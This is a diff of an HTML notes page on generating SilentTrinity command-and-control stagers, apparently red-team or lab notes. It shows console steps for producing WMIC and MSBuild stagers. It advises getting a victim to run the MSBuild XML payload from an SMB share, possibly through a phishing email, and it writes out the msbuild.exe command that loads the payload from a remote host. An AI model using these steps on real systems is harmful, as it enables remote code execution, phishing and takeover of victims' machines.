@@ -5,6 +5,8 @@
 <title>Create A Stager For Listener</title>
 </head><body>ST&gt;&gt; stagers<br/>
 ST (stagers) &gt;&gt; list<br/>
+<br/>
+<b>WMIC</b><br/>
 ST (stagers) &gt;&gt; use wmic<br/>
 ST (stagers)(wmic) &gt;&gt; generate &lt;listener name&gt;<br/>
 [+] Generated stager to wmic.xsl<br/>
@@ -15,5 +17,17 @@ ST (stagers)(wmic) &gt;&gt; generate &lt;listener name&gt;<br/>
 Should be in SilentTrinity/Server/wmic.xsl<br/>
 <br/>
 Need to start own web server to host wmic.xsl or transfer it to target and execute locally<br/>
+<br/>
+<br/>
+<br/>
+<b>MSBUILD</b><br/>
+ST (stagers) &gt;&gt; use msbuild<br/>
+ST (stagers)(msbuild) &gt;&gt; generate &lt;listener name&gt;<br/>
+[+] Generated stager to msbuild.xml<br/>
+[*] Launch with 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml'<br/>
+<br/>
+Finally, the trick now is to get the victim to execute the xml file via SMB path. Of course this is easy if you already have a shell on the machine, otherwise it’s possible to embed this link in a phishing email.<br/>
+<br/>
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe \\192.168.43.248\SMB\msbuild.xml<br/>
 <br/>
 </body></html>
